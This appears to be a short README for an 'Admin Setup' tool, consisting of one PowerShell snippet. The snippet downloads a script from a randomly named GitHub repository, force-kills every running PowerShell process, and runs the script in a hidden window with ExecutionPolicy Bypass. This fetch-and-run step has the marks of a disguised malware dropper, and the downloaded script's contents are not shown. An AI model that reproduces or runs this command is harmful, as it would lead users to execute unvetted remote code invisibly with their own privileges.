# Admin Setup

Two badges only: folder and PowerShell. No trash button.

```powershell
$dst = "$env:USERPROFILE\admin\Admin-Setup.ps1"
New-Item -ItemType Directory -Force -Path (Split-Path $dst) | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile $dst
Get-Process powershell -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
powershell -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $dst -Mode Badges
```
